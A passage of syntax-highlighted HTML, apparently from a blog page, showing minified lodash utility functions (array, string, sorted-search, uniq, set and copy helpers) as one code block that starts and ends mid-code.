&#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">jr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> n = t ? e.<span class="property">length</span> : <span class="number">0</span>, r = n - <span class="number">1</span>; n--;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> i = e[n];</span><br><span class="line">                                    <span class="keyword">if</span> (n == r || i !== o) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> o = i;</span><br><span class="line">                                        <span class="title function_">co</span>(i) ? <span class="title class_">Xt</span>.<span class="title function_">call</span>(t, i, <span class="number">1</span>) : <span class="title function_">ti</span>(t, i)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> t</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Fr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t + <span class="title function_">tn</span>(<span class="title function_">hn</span>() * (e - t + <span class="number">1</span>))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Dr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                <span class="keyword">if</span> (!t || e &lt; <span class="number">1</span> || e &gt; <span class="number">9007199254740991</span>)</span><br><span class="line">                                    <span class="keyword">return</span> n;</span><br><span class="line">                                <span class="keyword">do</span> &#123;</span><br><span class="line">                                    e % <span class="number">2</span> &amp;&amp; (n += t),</span><br><span class="line">                                    (e = <span class="title function_">tn</span>(e / <span class="number">2</span>)) &amp;&amp; (t += t)</span><br><span class="line">                                &#125; <span class="keyword">while</span> (e);</span><br><span class="line">                                <span class="keyword">return</span> n</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Nr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">xo</span>(<span class="title function_">mo</span>(t, e, <span class="title class_">Wc</span>), t + <span class="string">&quot;&quot;</span>)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Rr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Rn</span>(<span class="title class_">Oc</span>(t))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Ir</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = <span class="title class_">Oc</span>(t);</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">So</span>(n, <span class="title class_">Zn</span>(e, <span class="number">0</span>, n.<span class="property">length</span>))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">$r</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!<span class="title class_">Ua</span>(t))</span><br><span class="line">                                    <span class="keyword">return</span> t;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> i = -<span class="number">1</span>, o = (e = <span class="title function_">si</span>(e, t)).<span class="property">length</span>, a = o - <span class="number">1</span>, c = t; <span class="literal">null</span> != c &amp;&amp; ++i &lt; o;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> s = <span class="title class_">Ho</span>(e[i])</span><br><span class="line">                                        , u = n;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="string">&quot;__proto__&quot;</span> === s || <span class="string">&quot;constructor&quot;</span> === s || <span class="string">&quot;prototype&quot;</span> === s)</span><br><span class="line">                                        <span class="keyword">return</span> t;</span><br><span class="line">                                    <span class="keyword">if</span> (i != a) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> l = c[s];</span><br><span class="line">                                        <span class="keyword">void</span> <span class="number">0</span> === (u = r ? <span class="title function_">r</span>(l, s, c) : <span class="keyword">void</span> <span class="number">0</span>) &amp;&amp; (u = <span class="title class_">Ua</span>(l) ? l : <span class="title function_">co</span>(e[i + <span class="number">1</span>]) ? [] : &#123;&#125;)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="title class_">Un</span>(c, s, u),</span><br><span class="line">                                        c = c[s]</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> t</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Br</span> = bn ? <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> bn.<span class="title function_">set</span>(t, e),</span><br><span class="line">                                        t</span><br><span class="line">                                &#125;</span><br><span class="line">                                : <span class="title class_">Wc</span></span><br><span class="line">                                , <span class="title class_">Ur</span> = ye ? <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">ye</span>(t, <span class="string">&quot;toString&quot;</span>, &#123;</span><br><span class="line">                                        <span class="attr">configurable</span>: !<span class="number">0</span>,</span><br><span class="line">                                        <span class="attr">enumerable</span>: !<span class="number">1</span>,</span><br><span class="line">                                        <span class="attr">value</span>: <span class="title class_">Uc</span>(e),</span><br><span class="line">                                        <span class="attr">writable</span>: !<span class="number">0</span></span><br><span class="line">                                    &#125;)</span><br><span class="line">                                &#125;</span><br><span class="line">                                : <span class="title class_">Wc</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">qr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">So</span>(<span class="title class_">Oc</span>(t))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Yr</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> i = -<span class="number">1</span></span><br><span class="line">                                    , o = t.<span class="property">length</span>;</span><br><span class="line">                                e &lt; <span class="number">0</span> &amp;&amp; (e = -e &gt; o ? <span class="number">0</span> : o + e),</span><br><span class="line">                                (n = n &gt; o ? o : n) &lt; <span class="number">0</span> &amp;&amp; (n += o),</span><br><span class="line">                                    o = e &gt; n ? <span class="number">0</span> : n - e &gt;&gt;&gt; <span class="number">0</span>,</span><br><span class="line">                                    e &gt;&gt;&gt;= <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="title function_">r</span>(o); ++i &lt; o;)</span><br><span class="line">                                    a[i] = t[i + e];</span><br><span class="line">                                <span class="keyword">return</span> a</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Wr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">er</span>(t, (<span class="keyword">function</span> (<span class="params">t, r, i</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> !(n = <span class="title function_">e</span>(t, r, i))</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                    !!n</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Xr</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = <span class="number">0</span></span><br><span class="line">                                    , i = <span class="literal">null</span> == t ? r : t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="string">&quot;number&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; e == e &amp;&amp; i &lt;= <span class="number">2147483647</span>) &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (; r &lt; i;) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> o = r + i &gt;&gt;&gt; <span class="number">1</span></span><br><span class="line">                                            , a = t[o];</span><br><span class="line">                                        <span class="literal">null</span> !== a &amp;&amp; !<span class="title class_">Ja</span>(a) &amp;&amp; (n ? a &lt;= e : a &lt; e) ? r = o + <span class="number">1</span> : i = o</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> i</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Gr</span>(t, e, <span class="title class_">Wc</span>, n)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Gr</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line">                                    , o = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="number">0</span> === o)</span><br><span class="line">                                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> a = (e = <span class="title function_">n</span>(e)) != e, c = <span class="literal">null</span> === e, s = <span class="title class_">Ja</span>(e), u = <span class="keyword">void</span> <span class="number">0</span> === e; i &lt; o;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> l = <span class="title function_">tn</span>((i + o) / <span class="number">2</span>)</span><br><span class="line">                                        , h = <span class="title function_">n</span>(t[l])</span><br><span class="line">                                        , f = <span class="keyword">void</span> <span class="number">0</span> !== h</span><br><span class="line">                                        , d = <span class="literal">null</span> === h</span><br><span class="line">                                        , p = h == h</span><br><span class="line">                                        , v = <span class="title class_">Ja</span>(h);</span><br><span class="line">                                    <span class="keyword">if</span> (a)</span><br><span class="line">                                        <span class="keyword">var</span> m = r || p;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        m = u ? p &amp;&amp; (r || f) : c ? p &amp;&amp; f &amp;&amp; (r || !d) : s ? p &amp;&amp; f &amp;&amp; !d &amp;&amp; (r || !v) : !d &amp;&amp; !v &amp;&amp; (r ? h &lt;= e : h &lt; e);</span><br><span class="line">                                    m ? i = l + <span class="number">1</span> : o = l</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">sn</span>(o, <span class="number">4294967294</span>)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Zr</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> n = -<span class="number">1</span>, r = t.<span class="property">length</span>, i = <span class="number">0</span>, o = []; ++n &lt; r;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> a = t[n]</span><br><span class="line">                                        , c = e ? <span class="title function_">e</span>(a) : a;</span><br><span class="line">                                    <span class="keyword">if</span> (!n || !<span class="title class_">Oa</span>(c, s)) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> s = c;</span><br><span class="line">                                        o[i++] = <span class="number">0</span> === a ? <span class="number">0</span> : a</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> o</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Qr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="string">&quot;number&quot;</span> == <span class="keyword">typeof</span> t ? t : <span class="title class_">Ja</span>(t) ? <span class="title class_">NaN</span> : +t</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Jr</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t)</span><br><span class="line">                                    <span class="keyword">return</span> t;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="title class_">Va</span>(t))</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">de</span>(t, <span class="title class_">Jr</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="title class_">Ja</span>(t))</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Tn</span> ? <span class="title class_">Tn</span>.<span class="title function_">call</span>(t) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                <span class="keyword">var</span> e = t + <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                <span class="keyword">return</span> <span class="string">&quot;0&quot;</span> == e &amp;&amp; <span class="number">1</span> / t == -<span class="number">1</span> / <span class="number">0</span> ? <span class="string">&quot;-0&quot;</span> : e</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Kr</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = -<span class="number">1</span></span><br><span class="line">                                    , i = he</span><br><span class="line">                                    , o = t.<span class="property">length</span></span><br><span class="line">                                    , a = !<span class="number">0</span></span><br><span class="line">                                    , c = []</span><br><span class="line">                                    , s = c;</span><br><span class="line">                                <span class="keyword">if</span> (n)</span><br><span class="line">                                    a = !<span class="number">1</span>,</span><br><span class="line">                                        i = fe;</span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span> (o &gt;= <span class="number">200</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> u = e ? <span class="literal">null</span> : <span class="title class_">Di</span>(t);</span><br><span class="line">                                    <span class="keyword">if</span> (u)</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Ue</span>(u);</span><br><span class="line">                                    a = !<span class="number">1</span>,</span><br><span class="line">                                        i = <span class="title class_">Le</span>,</span><br><span class="line">                                        s = <span class="keyword">new</span> <span class="title class_">Fn</span></span><br><span class="line">                                &#125; <span class="keyword">else</span></span><br><span class="line">                                    s = e ? [] : c;</span><br><span class="line">                                <span class="attr">t</span>: <span class="keyword">for</span> (; ++r &lt; o;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> l = t[r]</span><br><span class="line">                                        , h = e ? <span class="title function_">e</span>(l) : l;</span><br><span class="line">                                    <span class="keyword">if</span> (l = n || <span class="number">0</span> !== l ? l : <span class="number">0</span>,</span><br><span class="line">                                    a &amp;&amp; h == h) &#123;</span><br><span class="line">                                        <span class="keyword">for</span> (<span class="keyword">var</span> f = s.<span class="property">length</span>; f--;)</span><br><span class="line">                                            <span class="keyword">if</span> (s[f] === h)</span><br><span class="line">                                                <span class="keyword">continue</span> t;</span><br><span class="line">                                        e &amp;&amp; s.<span class="title function_">push</span>(h),</span><br><span class="line">                                            c.<span class="title function_">push</span>(l)</span><br><span class="line">                                    &#125; <span class="keyword">else</span></span><br><span class="line">                                        <span class="title function_">i</span>(s, h, n) || (s !== c &amp;&amp; s.<span class="title function_">push</span>(h),</span><br><span class="line">                                            c.<span class="title function_">push</span>(l))</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> c</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ti</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> == (t = <span class="title function_">go</span>(t, e = <span class="title function_">si</span>(e, t))) || <span class="keyword">delete</span> t[<span class="title class_">Ho</span>(<span class="title class_">Ro</span>(e))]</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ei</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> $r(t, e, <span class="title function_">n</span>(<span class="title function_">fr</span>(t, e)), r)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ni</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> i = t.<span class="property">length</span>, o = r ? i : -<span class="number">1</span>; (r ? o-- : ++o &lt; i) &amp;&amp; <span class="title function_">e</span>(t[o], o, t);)</span><br><span class="line">                                    ;</span><br><span class="line">                                <span class="keyword">return</span> n ? <span class="title class_">Yr</span>(t, r ? <span class="number">0</span> : o, r ? o + <span class="number">1</span> : i) : <span class="title class_">Yr</span>(t, r ? o + <span class="number">1</span> : <span class="number">0</span>, r ? i : o)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ri</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = t;</span><br><span class="line">                                <span class="keyword">return</span> n <span class="keyword">instanceof</span> <span class="title class_">Ln</span> &amp;&amp; (n = n.<span class="title function_">value</span>()),</span><br><span class="line">                                    <span class="title function_">ve</span>(e, (<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> e.<span class="property">func</span>.<span class="title function_">apply</span>(e.<span class="property">thisArg</span>, <span class="title function_">pe</span>([t], e.<span class="property">args</span>))</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    ), n)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ii</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> i = t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">if</span> (i &lt; <span class="number">2</span>)</span><br><span class="line">                                    <span class="keyword">return</span> i ? <span class="title class_">Kr</span>(t[<span class="number">0</span>]) : [];</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> o = -<span class="number">1</span>, a = <span class="title function_">r</span>(i); ++o &lt; i;)</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> c = t[o], s = -<span class="number">1</span>; ++s &lt; i;)</span><br><span class="line">                                        s != o &amp;&amp; (a[o] = <span class="title function_">tr</span>(a[o] || c, t[s], e, n));</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Kr</span>(<span class="title function_">ar</span>(a, <span class="number">1</span>), e, n)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">oi</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> r = -<span class="number">1</span>, i = t.<span class="property">length</span>, o = e.<span class="property">length</span>, a = &#123;&#125;; ++r &lt; i;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> c = r &lt; o ? e[r] : <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                                    <span class="title function_">n</span>(a, t[r], c)</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> a</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ai</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Fa</span>(t) ? t : []</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ci</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> t ? t : <span class="title class_">Wc</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">si</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Va</span>(t) ? t : <span class="title function_">uo</span>(t, e) ? [t] : <span class="title class_">Co</span>(<span class="title function_">sc</span>(t))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> ui = <span class="title class_">Nr</span>;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">li</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">return</span> n = <span class="keyword">void</span> <span class="number">0</span> === n ? r : n,</span><br><span class="line">                                    !e &amp;&amp; n &gt;= r ? t : <span class="title class_">Yr</span>(t, e, n)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> hi = <span class="title class_">Ce</span> || <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Wt</span>.<span class="built_in">clearTimeout</span>(t)</span><br><span class="line">                                &#125;</span><br><span class="line">                            ;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">fi</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (e)</span><br><span class="line">                                    <span class="keyword">return</span> t.<span class="title function_">slice</span>();</span><br><span class="line">                                <span class="keyword">var</span> n = t.<span class="property">length</span></span><br><span class="line">                                    , r = jt ? <span class="title function_">jt</span>(n) : <span class="keyword">new</span> t.<span class="title function_">constructor</span>(<span class="params">n</span>);</span><br><span class="line">                                <span class="keyword">return</span> t.<span class="title function_">copy</span>(r),</span><br><span class="line">                                    r</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">di</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> e = <span class="keyword">new</span> t.<span class="title function_">constructor</span>(<span class="params">t.byteLength</span>);</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Vt</span>(e).<span class="title function_">set</span>(<span class="keyword">new</span> <span class="title class_">Vt</span>(t)),</span><br><span class="line">                                    e</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">pi</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = e ? <span class="title function_">di</span>(t.<span class="property">buffer</span>) : t.<span class="property">buffer</span>;</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">new</span> t.<span class="title function_">constructor</span>(<span class="params">n, t.byteOffset, t.length</span>)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">vi</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (t !== e) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="keyword">void</span> <span class="number">0</span> !== t</span><br><span class="line">                                        , r = <span class="literal">null</span> === t</span><br><span class="line">                                        , i = t == t</span><br><span class="line">                                        , o = <span class="title class_">Ja</span>(t)</span><br><span class="line">                                        , a = <span class="keyword">void</span> <span class="number">0</span> !== e</span><br><span class="line">                                        , c = <span class="literal">null</span> === e</span><br><span class="line">                                        , s = e == e</span><br><span class="line">                                        , u = <span class="title class_">Ja</span>(e);</span><br><span class="line">                                    <span class="keyword">if</span> (!c &amp;&amp; !u &amp;&amp; !o &amp;&amp; t &gt; e || o &amp;&amp; a &amp;&amp; s &amp;&amp; !c &amp;&amp; !u || r &amp;&amp; a &amp;&amp; s || !n &amp;&amp; s || !i)</span><br><span class="line">                                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (!r &amp;&amp; !o &amp;&amp; !u &amp;&amp; t &lt; e || u &amp;&amp; n &amp;&amp; i &amp;&amp; !r &amp;&amp; !o || c &amp;&amp; n &amp;&amp; i || !a &amp;&amp; i || !s)</span><br><span class="line">                                        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">mi</span>(<span class="params">t, e, n, i</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> o = -<span class="number">1</span>, a = t.<span class="property">length</span>, c = n.<span class="property">length</span>, s = -<span class="number">1</span>, u = e.<span class="property">length</span>, l = <span class="title function_">cn</span>(a - c, <span class="number">0</span>), h = <span class="title function_">r</span>(u + l), f = !i; ++s &lt; u;)</span><br><span class="line">                                    h[s] = e[s];</span><br><span class="line">                                <span class="keyword">for</span> (; ++o &lt; c;)</span><br><span class="line">                                    (f || o &lt; a) &amp;&amp; (h[n[o]] = t[o]);</span><br><span class="line">                                <span class="keyword">for</span> (; l--;)</span><br><span class="line">                                    h[s++] = t[o++];</span><br><span class="line">                                <span class="keyword">return</span> h</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">gi</span>(<span class="params">t, e, n, i</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> o = -<span class="number">1</span>, a = t.<span class="property">length</span>, c = -<span class="number">1</span>, s = n.<span class="property">length</span>, u = -<span class="number">1</span>, l = e.<span class="property">length</span>, h = <span class="title function_">cn</span>(a - s, <span class="number">0</span>), f = <span class="title function_">r</span>(h + l), d = !i; ++o &lt; h;)</span><br><span class="line">                                    f[o] = t[o];</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> p = o; ++u &lt; l;)</span><br><span class="line">                                    f[p + u] = e[u];</span><br><span class="line">                                <span class="keyword">for</span> (; ++c &lt; s;)</span><br><span class="line">                                    (d || o &lt; a) &amp;&amp; (f[p + n[c]] = t[o++]);</span><br><span class="line">                                <span class="keyword">return</span> f</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">yi</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> n = -<span class="number">1</span></span><br><span class="line">                                    , i = t.<span class="property">length</span>;</span><br><span class="line">                                <span class="keyword">for</span> (e || (e = <span class="title function_">r</span>(i)); ++n &lt; i;)</span><br><span class="line">                                    e[n] = t[n];</span><br><span class="line">                                <span class="keyword">return</span> e</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">bi</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> i = !n;</span><br><span class="line">                                n || (n = &#123;&#125;);</span><br><span class="line">                                <span class="keyword">for</span> (<span class="keyword">var</span> o = -<span class="number">1</span>, a = e.<span class="property">length</span>; ++o &lt; a;) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> c = e[o]</span><br><span class="line">                                        , s = r ? <span class="title function_">r</span>(n[c], t[c], c, n, t) : <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                                    <span class="keyword">void</span> <span class="number">0</span> === s &amp;&amp; (s = t[c]),</span><br><span class="line">                                        i ? <span class="title class_">Xn</span>(n, c, s) : <span class="title class_">Un</span>(n, c, s)</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span> n</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">wi</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">n, r</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> i = <span class="title class_">Va</span>(n) ? ae : <span class="title class_">Yn</span></span><br><span class="line">                                        , o = e ? <span class="title function_">e</span>() : &#123;&#125;;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">i</span>(n, t, <span class="title class_">Qi</span>(r, <span class="number">2</span>), o)</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">_i</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Nr</span>((<span class="keyword">function</span> (<span class="params">e, n</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> r = -<span class="number">1</span></span><br><span class="line">                                            , i = n.<span class="property">length</span></span><br><span class="line">                                            , o = i &gt; <span class="number">1</span> ? n[i - <span class="number">1</span>] : <span class="keyword">void</span> <span class="number">0</span></span><br><span class="line">                                            , a = i &gt; <span class="number">2</span> ? n[<span class="number">2</span>] : <span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">for</span> (o = t.<span class="property">length</span> &gt; <span class="number">3</span> &amp;&amp; <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> o ? (i--,</span><br><span class="line">                                            o) : <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                                             a &amp;&amp; <span class="title function_">so</span>(n[<span class="number">0</span>], n[<span class="number">1</span>], a) &amp;&amp; (o = i &lt; <span class="number">3</span> ? <span class="keyword">void</span> <span class="number">0</span> : o,</span><br><span class="line">                                                 i = <span class="number">1</span>),</span><br><span class="line">                                                 e = <span class="title function_">pt</span>(e); ++r &lt; i;) &#123;</span><br><span class="line">                                            <span class="keyword">var</span> c = n[r];</span><br><span class="line">                                            c &amp;&amp; <span class="title function_">t</span>(e, c, r, o)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">return</span> e</span><br><span class="line">                                    &#125;</span><br><span class="line">                                ))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">xi</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">n, r</span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="literal">null</span> == n)</span><br><span class="line">                                        <span class="keyword">return</span> n;</span><br><span class="line">                                    <span 